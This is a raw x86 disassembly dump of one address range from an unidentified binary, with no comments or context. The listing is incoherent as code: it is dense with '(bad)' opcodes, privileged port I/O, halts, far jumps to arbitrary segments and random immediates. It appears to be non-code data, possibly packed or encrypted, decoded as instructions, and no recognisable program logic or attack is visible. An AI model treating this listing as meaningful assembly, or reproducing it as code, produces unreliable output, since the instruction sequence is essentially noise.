  41e98e:	add    ebx,DWORD PTR [esi]
  41e990:	(bad)  
  41e991:	jnp    0x41e95a
  41e993:	jnp    0x41e988
  41e995:	jbe    0x41e9c3
  41e997:	cs fldcw WORD PTR es:[esi]
  41e99b:	repz ror DWORD PTR [edx-0x72],0xc2
  41e9a0:	jge    0x41ea1c
  41e9a2:	or     bl,BYTE PTR [edi+0x7a]
  41e9a5:	jp     0x41ea09
  41e9a7:	ins    DWORD PTR es:[edi],dx
  41e9a8:	jae    0x41e966
  41e9aa:	std    
  41e9ab:	out    dx,al
  41e9ac:	dec    esi
  41e9ad:	in     eax,dx
  41e9ae:	or     BYTE PTR [ebp+0x1b],0x47
  41e9b2:	jmp    0x2962:0xc08d885
  41e9b9:	sahf   
  41e9ba:	jge    0x41ea30
  41e9bc:	outs   dx,BYTE PTR ds:[esi]
  41e9bd:	es xchg ebx,eax
  41e9bf:	lods   al,BYTE PTR ds:[esi]
  41e9c0:	dec    ecx
  41e9c1:	push   edx
  41e9c2:	ret    0x3049
  41e9c5:	push   0xfffffff3
  41e9c7:	outs   dx,BYTE PTR ds:[esi]
  41e9c8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e9c9:	sub    BYTE PTR [edx-0x6ef2c87b],dh
  41e9cf:	sbb    bh,BYTE PTR [ebp+0x2]
  41e9d2:	jo     0x41e98e
  41e9d4:	in     eax,0x54
  41e9d6:	adc    eax,DWORD PTR ds:0xfac9af1f
  41e9dc:	in     al,dx
  41e9dd:	or     DWORD PTR [ebp+0x7d],esi
  41e9e0:	dec    edi
  41e9e1:	std    
  41e9e2:	jo     0x41e965
  41e9e4:	ffreep st(7)
  41e9e6:	xchg   edx,eax
  41e9e7:	and    DWORD PTR [esi],ecx
  41e9e9:	push   ecx
  41e9ea:	in     al,0x2b
  41e9ec:	call   0x7c360b1e
  41e9f1:	inc    esp
  41e9f2:	sbb    bl,BYTE PTR [eax+0x55]
  41e9f5:	out    dx,al
  41e9f6:	aas    
  41e9f7:	cli    
  41e9f8:	ret    
  41e9f9:	(bad)  
  41e9fa:	into   
  41e9fb:	in     eax,dx
  41e9fc:	mov    edx,0x7b04b2e1
  41ea01:	mov    DWORD PTR [edx-0x33ab346c],ebp
  41ea07:	pop    ebx
  41ea08:	retf   
  41ea09:	adc    dh,BYTE PTR [edi-0xaad3d08]
  41ea0f:	mov    ah,0x89
  41ea11:	mov    eax,fs
  41ea13:	inc    eax
  41ea14:	test   cl,bh
  41ea16:	ret    
  41ea17:	add    eax,0x5d6ffb9a
  41ea1c:	push   edi
  41ea1d:	mov    dl,0xec
  41ea1f:	mov    eax,0xb95bb1a8
  41ea24:	pop    esi
  41ea25:	pop    eax
  41ea26:	(bad)  cs:[eax+0x7e]
  41ea2a:	dec    edi
  41ea2b:	enter  0x4979,0xb3
  41ea2f:	call   0xfa84c725
  41ea34:	retf   0x721e
  41ea37:	retf   
  41ea38:	popa   
  41ea39:	inc    esp
  41ea3a:	(bad)  
  41ea3b:	scas   eax,DWORD PTR es:[edi]
  41ea3c:	sub    bl,BYTE PTR [ecx-0x752fc6d9]
  41ea42:	jbe    0x41ea09
  41ea44:	aad    0x5a
  41ea46:	in     al,dx
  41ea47:	ja     0x41eab6
  41ea49:	iret   
  41ea4a:	add    al,0xe8
  41ea4c:	xchg   edx,eax
  41ea4d:	scas   al,BYTE PTR es:[edi]
  41ea4e:	cmp    al,0x99
  41ea50:	xchg   ecx,eax
  41ea51:	xchg   edi,eax
  41ea52:	into   
  41ea53:	out    0x32,eax
  41ea55:	adc    ah,al
  41ea57:	iret   
  41ea58:	(bad)  
  41ea59:	arpl   ax,sp
  41ea5b:	jge    0x41e9f0
  41ea5d:	jb     0x41e9f7
  41ea5f:	dec    ecx
  41ea60:	ja     0x41eaaf
  41ea62:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ea63:	dec    eax
  41ea64:	nop
  41ea65:	mov    ss,WORD PTR [ebx-0x40]
  41ea68:	in     eax,0x5e
  41ea6a:	push   0xffffffd6
  41ea6c:	rcl    BYTE PTR [edx],1
  41ea6e:	rol    BYTE PTR ss:[eax],1
  41ea71:	or     eax,0xb48cb2e2
  41ea76:	pop    edx
  41ea77:	inc    edi
  41ea78:	xlat   BYTE PTR ds:[ebx]
  41ea79:	dec    edx
  41ea7a:	mov    cl,ah
  41ea7c:	dec    ecx
  41ea7d:	jmp    0x41ea0c
  41ea7f:	pop    ebx
  41ea80:	outs   dx,BYTE PTR ds:[esi]
  41ea81:	sbb    BYTE PTR [eax-0x6f11df1f],ah
  41ea87:	xlat   BYTE PTR ds:[ebx]
  41ea88:	std    
  41ea89:	in     eax,0xd4
  41ea8b:	xchg   esi,esi
  41ea8d:	lods   eax,DWORD PTR ds:[esi]
  41ea8e:	mov    ebp,0x995226d4
  41ea93:	adc    esi,edi
  41ea95:	inc    ebx
  41ea96:	call   0x81e2a722
  41ea9b:	sbb    al,0xaa
  41ea9d:	fmul   QWORD PTR [ebp-0x2a5fc65a]
  41eaa3:	cwde   
  41eaa4:	stc    
  41eaa5:	pushf  
  41eaa6:	mov    ebx,0x4277749b
  41eaab:	or     eax,0xdc024371
  41eab0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41eab1:	fst    QWORD PTR [ebx]
  41eab3:	imul   esi,ebp,0xc721c4b6
  41eab9:	adc    edx,DWORD PTR [ecx-0x26]
  41eabc:	jecxz  0x41ea8e
  41eabe:	ror    DWORD PTR [esi],cl
  41eac0:	jns    0x41ea70
  41eac2:	xchg   esi,eax
  41eac3:	dec    edx
  41eac4:	idiv   DWORD PTR [edx+eax*4-0x60168bf4]
  41eacb:	loopne 0x41eaa3
  41eacd:	sub    al,0x44
  41eacf:	inc    edi
  41ead0:	rol    BYTE PTR [ecx+0x3cde8521],0x10
  41ead7:	(bad)  
  41ead8:	imul   eax,DWORD PTR [esi-0x4],0xffffffec
  41eadc:	sub    bh,dh
  41eade:	and    DWORD PTR [eax+0x70],edx
  41eae1:	xchg   ecx,eax
  41eae2:	into   
  41eae3:	mov    ecx,0x4ff2ac2f
  41eae8:	xchg   BYTE PTR [esp+esi*2-0x42],bl
  41eaec:	in     al,dx
  41eaed:	mov    dh,0x9b
  41eaef:	adc    BYTE PTR ds:0x6d924598,cl
  41eaf5:	out    dx,al
  41eaf6:	push   ebx
  41eaf7:	scas   al,BYTE PTR es:[edi]
  41eaf8:	pushf  
  41eaf9:	(bad)  
  41eafa:	iret   
  41eafb:	mov    edx,0x583c56d2
  41eb00:	es out dx,eax
  41eb02:	dec    edi
  41eb03:	inc    eax
  41eb04:	xchg   BYTE PTR [ebx+0x6ce87859],cl
  41eb0a:	dec    edi
  41eb0b:	pushf  
  41eb0c:	test   DWORD PTR [ebp+0x5150f7e0],eax
  41eb12:	test   al,0xc0
  41eb14:	ins    DWORD PTR es:[edi],dx
  41eb15:	fisttp WORD PTR [edx-0x6e]
  41eb18:	sbb    DWORD PTR [ebx+ebx*8-0x3a6c7b05],0xa84d9be2
  41eb23:	cmp    ebp,ebp
  41eb25:	mov    bl,0xf6
  41eb27:	into   
  41eb28:	mov    dl,0xe8
  41eb2b:	dec    eax
  41eb2c:	jle    0x41eb39
  41eb2e:	fcomp  DWORD PTR [eax+0x4e]
  41eb31:	and    eax,0xdb5057bc
  41eb36:	mov    dl,0xd5
  41eb38:	pushf  
  41eb39:	inc    ebp
  41eb3a:	out    0x3d,al
  41eb3c:	ss mov al,0xec
  41eb3f:	cmp    eax,0xbfc05146
  41eb44:	mov    dl,0x77
  41eb46:	int    0xa
  41eb48:	imul   esp,esi,0xe38b8516
  41eb4e:	int    0x9c
  41eb50:	mov    ds:0xa531fb8e,eax
  41eb55:	and    ch,ch
  41eb57:	push   0xf27d9afb
  41eb5c:	ja     0x41eaee
  41eb5e:	push   0x996121ec
  41eb63:	int    0x28
  41eb65:	mov    cl,0xf8
  41eb67:	adc    al,0xcc
  41eb69:	icebp  
  41eb6a:	into   
  41eb6b:	fild   WORD PTR [esp+eax*4]
  41eb6e:	xor    ebx,DWORD PTR [ecx]
  41eb70:	or     DWORD PTR ds:0x36b21d7b,ebx
  41eb76:	push   eax
  41eb77:	mov    dh,0x62
  41eb79:	sub    esi,DWORD PTR [eax+eiz*4-0x36]
  41eb7d:	cmp    bl,0x81
  41eb80:	sbb    ebx,edi
  41eb82:	lea    edi,[edx+0x70]
  41eb85:	mov    ah,0x67
  41eb87:	sbb    ebp,esi
  41eb89:	and    BYTE PTR [ecx+0x4d],cl
  41eb8c:	outs   dx,BYTE PTR ds:[esi]
  41eb8d:	jmp    0x5e5f:0xe2d12fcc
  41eb94:	sub    al,0xfb
  41eb96:	in     al,0x8e
  41eb98:	adc    ecx,DWORD PTR [edi+0x14]
  41eb9b:	xchg   edi,eax
  41eb9c:	inc    eax
  41eb9d:	sbb    BYTE PTR [ebx-0x6a],al
  41eba0:	cmp    DWORD PTR [edx-0xe],0xc25388a1
  41eba7:	push   0xffffff99
  41eba9:	pop    ebp
  41ebaa:	(bad)  
  41ebab:	int3   
  41ebac:	gs in  al,0x73
  41ebaf:	outs   dx,DWORD PTR ds:[esi]
  41ebb0:	cdq    
  41ebb1:	and    ecx,DWORD PTR ds:0xacf75d60
  41ebb7:	pop    ecx
  41ebb9:	or     dh,al
  41ebbb:	mov    ebx,esp
  41ebbd:	xchg   ecx,eax
  41ebbe:	and    BYTE PTR ds:0x9892337c,ch
  41ebc4:	and    dl,0xf9
  41ebc7:	pop    DWORD PTR [ecx]
  41ebc9:	cdq    
  41ebca:	xchg   ebx,eax
  41ebcb:	lds    esp,FWORD PTR ds:0xeb8281b4
  41ebd1:	mov    al,ds:0x21452389
  41ebd6:	mov    edi,0x9ac0cb94
  41ebdb:	call   0x5510:0xa587f424
  41ebe2:	cwde   
  41ebe3:	adc    bl,BYTE PTR [eax-0x42]
  41ebe6:	and    bl,BYTE PTR es:[edi+ebx*1]
  41ebea:	arpl   cx,cx
  41ebec:	add    ah,0x8e
  41ebef:	push   ss
  41ebf0:	in     eax,dx
  41ebf1:	pop    ecx
  41ebf2:	dec    edx
  41ebf3:	cmp    eax,0xecb7242f
  41ebf8:	lods   al,BYTE PTR ds:[esi]
  41ebf9:	jns    0x41eb7c
  41ebfb:	mov    ch,0xe4
  41ebfd:	mov    cl,0x11
  41ebff:	or     al,0x5a
  41ec01:	cmp    BYTE PTR [edi+0x16],cl
  41ec04:	or     al,0xed
  41ec06:	pop    edi
  41ec07:	shl    DWORD PTR [esi-0x2b],cl
  41ec0a:	rcr    DWORD PTR [eax-0x63e8334d],cl
  41ec10:	popa   
  41ec11:	or     edx,esi
  41ec13:	scas   eax,DWORD PTR es:[edi]
  41ec14:	jecxz  0x41ec0e
  41ec16:	rcr    DWORD PTR [esi],cl
  41ec18:	sub    eax,0x5ed6a8c5
  41ec1d:	sbb    eax,0xdc202e05
  41ec22:	mov    eax,ds:0x732dd0ba
  41ec27:	and    eax,0x78c74059
  41ec2c:	sub    ebx,DWORD PTR [eax]
  41ec2e:	jns    0x41ec3b
  41ec30:	lahf   
  41ec31:	sbb    eax,0x89183eae
  41ec36:	lods   al,BYTE PTR ds:[esi]
  41ec37:	mov    esi,0xd3e0be57
  41ec3c:	push   edx
  41ec3d:	sub    BYTE PTR [edi-0x499f8635],0x27
  41ec44:	pusha  
  41ec45:	(bad)  
  41ec46:	aad    0xc6
  41ec48:	mov    ?,WORD PTR [ecx+0x21aeb5b]
  41ec4e:	pop    ss
  41ec4f:	sub    DWORD PTR [esi+edi*8+0x52fa9a11],eax
  41ec56:	fnsave [ebx+0xf34fc22]
  41ec5c:	cld    
  41ec5d:	mov    ebx,0x3b99c0ba
  41ec62:	xor    edi,eax
  41ec64:	xchg   DWORD PTR ss:[ebp-0x258f2463],esp
  41ec6b:	add    ebp,esi
  41ec6d:	in     eax,dx
  41ec6e:	cmc    
  41ec6f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ec70:	sub    edx,ebp
  41ec72:	popf   
  41ec73:	imul   edi,ecx,0x201582e8
  41ec79:	sub    eax,0x1907c474
  41ec7e:	xor    DWORD PTR [ecx-0x20],edi
  41ec81:	cmc    
  41ec82:	ss mov esi,eax
  41ec85:	retf   0xdc5b
  41ec88:	mov    fs,WORD PTR [edx]
  41ec8a:	mov    esi,0xa406bf22
  41ec8f:	pop    es
  41ec90:	push   esp
  41ec91:	jmp    0x41ecca
  41ec93:	xor    edx,esi
  41ec95:	mov    WORD PTR [edx-0x6d3de630],?
  41ec9b:	cmp    al,0x7a
  41ec9d:	out    0x7b,eax
  41ec9f:	aam    0xf
  41eca1:	or     eax,0x3a58785b
  41eca6:	nop
  41eca7:	call   0xb5fab809
  41ecac:	xchg   edi,eax
  41ecad:	imul   ebx,DWORD PTR [edi+eax*2+0x16],0x7fecb07e
  41ecb5:	pop    ebp
  41ecb6:	inc    esi
  41ecb8:	lahf   
  41ecb9:	fidiv  WORD PTR [ecx]
  41ecbb:	pop    es
  41ecbc:	out    dx,al
  41ecbd:	jmp    0x2cc4:0xc35c46c6
  41ecc4:	fdiv   DWORD PTR [esi+eiz*4]
  41ecc7:	or     DWORD PTR [ecx-0x3dd3c81a],edi
  41eccd:	iret   
  41ecce:	rcl    ah,0xd5
  41ecd1:	push   0xffffffa0
  41ecd3:	xor    al,0x6a
  41ecd5:	jb     0x41ec98
  41ecd7:	lea    ebx,[eax-0x3b]
  41ecda:	adc    esi,ebp
  41ecdc:	enter  0x6479,0x21
  41ece0:	es pop ss
  41ece2:	ins    BYTE PTR es:[edi],dx
  41ece3:	and    edx,DWORD PTR [eax]
  41ece5:	push   edx
  41ece6:	fs or  eax,0xce56f364
  41ecec:	imul   BYTE PTR [edi+0x35]
  41ecef:	adc    dh,bl
  41ecf1:	push   ds
  41ecf2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ecf3:	shr    BYTE PTR [edi-0x718cda4a],0x89
  41ecfa:	mov    esi,0x8acbfffa
  41ecff:	cmp    DWORD PTR [edx-0x5837aa05],edi
  41ed05:	cmp    eax,0x8a815c
  41ed0a:	clc    
  41ed0b:	jae    0x41ed0e
  41ed0d:	dec    esp
  41ed0e:	sar    DWORD PTR [ecx],1
  41ed10:	dec    edx
  41ed11:	fs mov ebp,0xe71d007f
  41ed17:	ficomp DWORD PTR [edx+0x1a6d01af]
  41ed1d:	mov    esi,0x6cfffdec
  41ed22:	mov    edx,0xc2170824
  41ed27:	xlat   BYTE PTR ds:[ebx]
  41ed28:	push   eax
  41ed29:	pushf  
  41ed2a:	jae    0x41ed19
  41ed2c:	in     al,dx
  41ed2d:	(bad)  
  41ed2e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ed2f:	rcr    DWORD PTR [esi+0x17],cl
  41ed32:	xchg   DWORD PTR [edi+0x30],ebp
  41ed35:	out    0x59,al
  41ed37:	push   ecx
  41ed38:	add    al,0xd0
  41ed3a:	push   ss
  41ed3b:	cmp    dl,0xf8
  41ed3e:	retf   
  41ed3f:	test   DWORD PTR [eax],ebx
  41ed41:	xor    eax,ebx
  41ed43:	test   esp,0xca489030
  41ed49:	jb     0x41ed79
  41ed4b:	xchg   ecx,eax
  41ed4c:	push   edi
  41ed4d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ed4e:	(bad)  
  41ed4f:	loop   0x41edc1
  41ed51:	sar    DWORD PTR [edi-0x5c],cl
  41ed54:	pop    esi
  41ed55:	les    eax,FWORD PTR [edx]
  41ed57:	mov    edx,0xcc5d1987
  41ed5c:	es std 
  41ed5e:	and    DWORD PTR [eax+edx*8-0x51902202],0x173de6b7
  41ed69:	repnz dec esp
  41ed6b:	loope  0x41ed37
  41ed6d:	aam    0xc4
  41ed6f:	(bad)  
  41ed70:	mov    ebx,ds
  41ed72:	xor    eax,0xfbe5c010
  41ed77:	xchg   ebx,eax
  41ed78:	push   edi
  41ed79:	mov    dl,BYTE PTR [esi]
  41ed7b:	sahf   
  41ed7c:	xor    eax,0x4e9c6d17
  41ed81:	mov    ah,0x4c
  41ed83:	cmp    DWORD PTR [esi+0x6cd69cdd],esi
  41ed89:	adc    DWORD PTR [edx+ebp*4],esi
  41ed8c:	add    BYTE PTR [esi],bl
  41ed8e:	les    ebp,FWORD PTR [edx+0x68]
  41ed91:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ed92:	cld    
  41ed93:	push   esi
  41ed94:	pop    edx
  41ed95:	jnp    0x41edda
  41ed97:	cli    
  41ed98:	cdq    
  41ed99:	pop    edi
  41ed9a:	stc    
  41ed9b:	dec    edi
  41ed9c:	popf   
  41ed9d:	jne    0x41edc1
  41ed9f:	mov    ds:0xf3c1b0b2,eax
  41eda4:	fcmovbe st,st(3)
  41eda6:	pop    esp
  41eda7:	adc    dh,BYTE PTR [ecx+0x744ad667]
  41edad:	cdq    
  41edae:	dec    edx
  41edaf:	retf   
  41edb0:	inc    edx
  41edb1:	es xchg eax,ebx
  41edb4:	cmp    eax,0xa5cae540
  41edb9:	in     eax,dx
  41edba:	mov    edx,0xb01dd670
  41edbf:	int    0x3d
  41edc1:	daa    
  41edc2:	loopne 0x41ed60
  41edc4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41edc5:	mov    esi,0x1f14176c
  41edca:	adc    DWORD PTR [esi],ecx
  41edcc:	push   esi
  41edcd:	add    DWORD PTR [ebx],edi
  41edcf:	push   ebx
  41edd0:	(bad)  
  41edd1:	imul   edx,eax,0x3772d8cf
  41edd7:	stos   DWORD PTR es:[edi],eax
  41edd8:	sub    BYTE PTR [ebp+0x4014c021],cl
  41edde:	dec    ebx
  41eddf:	jg     0x41ee49
  41ede1:	fld    TBYTE PTR [edx+0x20]
  41ede4:	mov    dh,0x48
  41ede6:	fisub  WORD PTR [ecx+0x285a3834]
  41edec:	sub    al,0xf3
  41edee:	xchg   ecx,eax
  41edef:	xchg   esi,eax
  41edf0:	out    dx,al
  41edf1:	dec    eax
  41edf2:	test   al,0x8c
  41edf4:	jmp    FWORD PTR [esi-0x76fe06ec]
  41edfa:	ss push edi
  41edfc:	xchg   esp,eax
  41edfd:	dec    eax
  41edfe:	mov    ds:0xb3a1c905,al
  41ee03:	loop   0x41edcd
  41ee05:	(bad)  
  41ee06:	bound  eax,QWORD PTR [ecx+edx*2]
  41ee09:	mov    eax,0x2b69d787
  41ee0f:	fimul  WORD PTR [ecx-0x507a1508]
  41ee15:	mov    edi,es
  41ee17:	cmp    eax,0x70cc4042
  41ee1c:	push   ecx
  41ee1d:	push   edi
  41ee1e:	push   esi
  41ee1f:	xchg   edi,eax
  41ee20:	mov    ds:0x6f56076f,eax
  41ee25:	pop    esp
  41ee26:	pop    ss
  41ee27:	hlt    
  41ee28:	dec    ecx
  41ee29:	retf   0xdabe
  41ee2c:	test   eax,0xa233c11b
  41ee31:	mov    esp,0x5c554264
  41ee36:	and    al,al
  41ee38:	pop    ecx
  41ee39:	mov    ecx,esi
  41ee3b:	in     al,0x4
  41ee3d:	adc    DWORD PTR [edi+0xe],0x5a7cff4
  41ee44:	outs   dx,DWORD PTR ds:[esi]
  41ee45:	aam    0x9f
  41ee47:	repz and al,0xb2
  41ee4a:	mov    ch,0x38
  41ee4c:	mov    esp,0x691725a0
  41ee51:	(bad)  
  41ee52:	mov    WORD PTR [ebx-0x7548cb85],cs
  41ee58:	test   DWORD PTR [edi+0x649f923e],edi
  41ee5e:	mov    ch,0x69
  41ee60:	mov    ds:0xd30e5e8,eax
  41ee65:	inc    eax
  41ee66:	imul   edx,DWORD PTR [ebp-0x725b5fd1],0x1b4c8481
  41ee70:	xchg   ecx,eax
  41ee71:	jg     0x41ee0c
  41ee73:	pop    ebx
  41ee74:	out    dx,eax
  41ee75:	mov    WORD PTR [ebx+0x12c7c0c3],ds
  41ee7b:	add    bl,ah
  41ee7d:	das    
  41ee7e:	xchg   edi,eax
  41ee7f:	inc    esp
  41ee80:	iret   
  41ee81:	mov    edx,0x6cc8d2a2
  41ee86:	int    0x43
  41ee88:	cmc    
  41ee89:	cld    
  41ee8a:	mov    esi,0x4de55d43
  41ee8f:	push   cs
  41ee90:	ret    
  41ee91:	pushf  
  41ee92:	jns    0x41ee2f
  41ee94:	pop    esp
  41ee95:	sub    DWORD PTR [ecx-0x51a00396],edi
  41ee9b:	sbb    BYTE PTR [edx+0x1d],bl
  41ee9e:	call   0x2b95:0x69644603
  41eea5:	sub    cl,BYTE PTR [ebx+0x47]
  41eea8:	mov    ds:0xc116d55b,eax
  41eead:	pop    es
  41eeae:	lds    ecx,FWORD PTR [ecx]
  41eeb0:	mov    ch,0x89
  41eeb2:	daa    
  41eeb3:	daa    
  41eeb4:	out    dx,al
  41eeb5:	test   DWORD PTR [eax+0x76],edi
  41eeb8:	add    BYTE PTR [esi],cl
  41eeba:	pop    ss
  41eebb:	add    dl,ah
  41eebd:	add    al,0xe
  41eebf:	and    al,0xa2
  41eec1:	cwde   
  41eec2:	xchg   ebx,eax
  41eec3:	inc    edi
  41eec4:	aas    
  41eec5:	pop    edi
  41eec6:	jns    0x41ee73
  41eec8:	and    BYTE PTR [ebp+0x60e9dc6a],dl
  41eece:	scas   al,BYTE PTR es:[edi]
  41eecf:	(bad)  
  41eed0:	xchg   esi,eax
  41eed1:	ret    0x7159
  41eed4:	(bad)  [ecx+0x67e3d61e]
  41eeda:	push   ss
  41eedb:	and    BYTE PTR [ebx-0x2a],dl
  41eede:	mov    edi,0x8d551e58
  41eee3:	jns    0x41eeb3
  41eee5:	inc    ebx
  41eee6:	mov    dh,0x26
  41eee8:	cld    
  41eee9:	push   edi
  41eeea:	xor    DWORD PTR [edx+eax*1],esp
  41eeed:	mov    esp,0xfe99c821
  41eef2:	loopne 0x41eefb
  41eef4:	mov    ds:0x7e2051d1,eax
  41eef9:	push   edi
  41eefa:	(bad)  
  41eefb:	jge    0x41eee5
  41eefd:	iret   
  41eefe:	clc    
  41eeff:	retf   0xd6c5
  41ef02:	mov    ebx,0xee14674f
  41ef07:	pop    es
  41ef08:	test   BYTE PTR [esi-0xd],dl
  41ef0b:	(bad)  
  41ef0c:	hlt    
  41ef0d:	call   0xdd3525b9
  41ef12:	pusha  
  41ef13:	mul    DWORD PTR [ebx+0x5098af9f]
  41ef19:	(bad)  [ecx-0x29]
  41ef1c:	push   es
  41ef1d:	jmp    0x1d840308
  41ef22:	xor    DWORD PTR [edi+0xe9a7bfe],ebp
  41ef28:	mov    ecx,0x22d275a1
  41ef2d:	jo     0x41eeff
  41ef2f:	mov    ah,al
  41ef31:	not    DWORD PTR [ebx]
  41ef33:	mov    eax,ds:0x48cc6e8c
  41ef38:	adc    DWORD PTR [ecx+ebx*8],0xffffffc6
  41ef3c:	stos   DWORD PTR es:[edi],eax
  41ef3d:	cmp    BYTE PTR [ebp-0x7c216f2a],dl
  41ef43:	xor    ch,BYTE PTR [edi-0x34e4bc8a]
  41ef49:	cwde   
  41ef4a:	std    
  41ef4b:	cmp    BYTE PTR [ebx],cl
  41ef4d:	ja     0x41eef2
  41ef4f:	fincstp 
  41ef51:	sub    ebp,eax
  41ef53:	hlt    
  41ef54:	test   esi,ebp
  41ef56:	or     edx,edx
  41ef58:	in     al,0x86
  41ef5a:	(bad)  
  41ef5c:	out    dx,al
  41ef5d:	or     eax,0xe5a921bb
  41ef62:	xlat   BYTE PTR ds:[ebx]
  41ef63:	inc    ebx
  41ef64:	fucom  st(0)
  41ef66:	mov    al,0x3
  41ef68:	mov    esp,0x3ca627a7
  41ef6d:	push   ss
  41ef6e:	into   
  41ef6f:	xchg   BYTE PTR [edi],ah
  41ef71:	in     al,dx
  41ef72:	mov    BYTE PTR [edx-0x77],ch
  41ef75:	mov    ebp,DWORD PTR [eax]
  41ef77:	add    dl,0x21
  41ef7a:	jmp    DWORD PTR [eax-0x6ae69799]
  41ef80:	dec    ebp
  41ef81:	mov    esi,0x163d54b1
  41ef86:	sar    bh,0xba
  41ef89:	or     DWORD PTR [ecx],esp
  41ef8b:	push   eax
  41ef8c:	(bad)  
  41ef8d:	xchg   ebx,eax
  41ef8e:	repz (bad) 
  41ef90:	out    0x94,al
  41ef92:	aas    
  41ef93:	xchg   BYTE PTR [edx-0x474a154],ah
  41ef99:	jp     0x41f00d
  41ef9b:	cmp    bl,bl
  41ef9d:	add    eax,0x9249a105
  41efa2:	repz xor esi,DWORD PTR [edi-0x39]
  41efa6:	pop    esp
  41efa7:	adc    BYTE PTR [eax+0x44],0x22
  41efab:	xor    ebp,edi
  41efad:	imul   ebx,DWORD PTR ds:0x56ab85df,0xffffff9d
  41efb4:	sbb    al,0x93
  41efb6:	or     ah,BYTE PTR [eax]
  41efb8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41efba:	dec    esi
  41efbb:	push   ebx
  41efbc:	push   esp
  41efbd:	div    DWORD PTR [ebx+0x4]
  41efc0:	mov    WORD PTR [ebx-0x6e],fs
  41efc3:	aam    0x6
  41efc5:	or     al,0x32
  41efc7:	sti    
  41efc8:	mov    esi,0x5385e6b5
  41efcd:	mov    eax,0xc0d5aa05
  41efd2:	ins    DWORD PTR es:[edi],dx
  41efd3:	sub    al,BYTE PTR [esp+esi*1+0x15]
  41efd7:	jno    0x41f015
  41efd9:	push   esp
  41efda:	out    0x40,eax
  41efdc:	mov    dl,0x27
  41efde:	xchg   ecx,eax
  41efdf:	cmp    eax,0x1b8eab0
  41efe4:	inc    esp
  41efe5:	arpl   WORD PTR [edi-0x2e],dx
  41efe8:	mov    esi,0x99bc6eb8
  41efed:	shl    ch,cl
  41efef:	push   edi
  41eff0:	sbb    al,bl
  41eff2:	shl    ch,1
  41eff4:	sbb    ebp,edx
  41eff6:	out    dx,eax
  41eff7:	rcl    DWORD PTR [edx-0x30],0x7
  41effb:	inc    edx
  41effc:	sub    DWORD PTR [ecx-0x105ad0e1],edi
  41f002:	mov    al,ds:0xb23e5796
  41f007:	xchg   ecx,eax
  41f008:	arpl   bx,bx
  41f00a:	addr16 jmp 0x6a967533
  41f010:	mov    dl,BYTE PTR [edi]
  41f012:	sub    ecx,esp
  41f014:	cmp    esi,DWORD PTR [ebx]
  41f016:	jb     0x41f04c
  41f018:	sbb    ch,BYTE PTR [esi-0x2a739ebe]
  41f01e:	jmp    0x41efec
  41f020:	pop    es
  41f021:	inc    ecx
  41f022:	mov    ebx,0x3c139993
  41f027:	sub    eax,0xdd490f4e
  41f02c:	mov    ebp,0x84931fd4
  41f031:	jb     0x41efd6
  41f033:	add    BYTE PTR [ecx+0x64669642],dh
  41f039:	push   cs
  41f03a:	or     DWORD PTR [esi+0x5fe10e49],ebp
  41f040:	loope  0x41f043
  41f042:	and    eax,0x36ebe3dc
  41f047:	xlat   BYTE PTR ds:[ebx]
  41f048:	jge    0x41f0bf
  41f04a:	dec    ebx
  41f04b:	or     esp,eax
  41f04d:	fldenv [esi-0x21978bb0]
  41f053:	mov    esi,0xd4dbc782
  41f058:	add    DWORD PTR [ebp+0x787a065f],0x7e844b3c
  41f062:	cmp    al,0x54
  41f064:	retf   0x9964
  41f067:	add    al,0x93
  41f069:	leave  
  41f06a:	xchg   DWORD PTR [ebx],edx
  41f06c:	test   DWORD PTR [esi],0x9e4fa46
  41f072:	(bad)  
  41f073:	cmp    BYTE PTR [ecx-0x1f],ah
  41f076:	push   esi
  41f077:	call   FWORD PTR [edx-0x9]
  41f07a:	out    dx,eax
  41f07b:	in     eax,dx
  41f07c:	jle    0x41f007
  41f07e:	sub    eax,0xdee16d8e
  41f083:	mov    al,ds:0x2e23d909
  41f088:	inc    esi
  41f089:	jae    0x41f0dd
  41f08b:	xor    eax,0x24756554
  41f090:	add    eax,0x2e3678b9
  41f095:	xchg   esi,eax
  41f096:	sub    DWORD PTR [edi-0x21],edx
  41f099:	mov    edx,0xd6b352c5
  41f09e:	stos   BYTE PTR es:[edi],al
  41f09f:	test   DWORD PTR [eax],edi
  41f0a1:	inc    eax
  41f0a2:	aas    
  41f0a3:	jae    0x41f081
  41f0a5:	or     BYTE PTR [ebp+0x2a8a1e86],bl
  41f0ab:	sahf   
  41f0ac:	pop    ds
  41f0ad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f0af:	out    dx,eax
  41f0b0:	loop   0x41f081
  41f0b2:	(bad)  
  41f0b3:	out    0x8,eax
  41f0b5:	xor    eax,0x7d47288d
  41f0ba:	imul   ecx,DWORD PTR [edx-0xc],0xffffffb3
  41f0be:	inc    esi
  41f0bf:	jmp    0x41f0dc
  41f0c1:	add    cl,BYTE PTR [ebx+0x58]
  41f0c4:	mov    ds:0x8b0fe315,al
  41f0c9:	lock xchg BYTE PTR ds:0xd928bf32,ch
  41f0d0:	mov    dl,cl
  41f0d2:	retf   
  41f0d3:	jae    0x41f08f
  41f0d5:	mov    al,ds:0x9353dc58
  41f0da:	daa    
  41f0db:	iret   
  41f0dc:	js     0x41f105
  41f0de:	mov    dh,0x31
  41f0e0:	mov    eax,0x4b0391a3
  41f0e5:	fisttp WORD PTR [ebx]
  41f0e7:	pop    edx
  41f0e8:	pop    eax
  41f0e9:	ret    
  41f0ea:	test   eax,0xfa710c24
  41f0ef:	inc    edi
  41f0f0:	or     eax,eax
  41f0f2:	jmp    DWORD PTR [ecx-0x206616c5]
  41f0f8:	shr    DWORD PTR [eax-0x3b],cl
  41f0fb:	(bad)  
  41f0fc:	shl    al,0xe7
  41f0ff:	inc    eax
  41f100:	fnstcw WORD PTR [eax+0x63]
  41f103:	mov    ecx,0xa86125f3
  41f108:	es mov al,ah
  41f10b:	stc    
  41f10c:	dec    edi
  41f10d:	sbb    eax,0x9d309587
  41f112:	dec    esi
  41f113:	dec    edi
  41f114:	mov    cl,0x0
